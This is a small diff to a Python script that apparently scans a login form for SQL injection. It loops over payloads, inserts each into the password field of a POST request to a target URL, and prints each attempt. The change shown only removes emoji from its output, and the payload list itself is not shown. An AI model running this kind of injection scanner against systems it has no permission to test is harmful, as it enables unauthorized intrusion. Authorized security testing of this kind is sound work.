@@ -18,11 +18,11 @@ post_data = {
     "password": ""  # This will be filled with SQL injection payloads
 }
 
-print(f"\n🔍 Scanning {target_url} for SQL Injection...\n")
+print(f"\nScanning {target_url} for SQL Injection...\n")
 
 for payload in payloads:
     post_data["password"] = payload  # Inject payload into password field
-    print(f"🛠️ Testing: {payload}")
+    print(f"Testing: {payload}")
 
     try:
         response = requests.post(target_url, data=post_data)
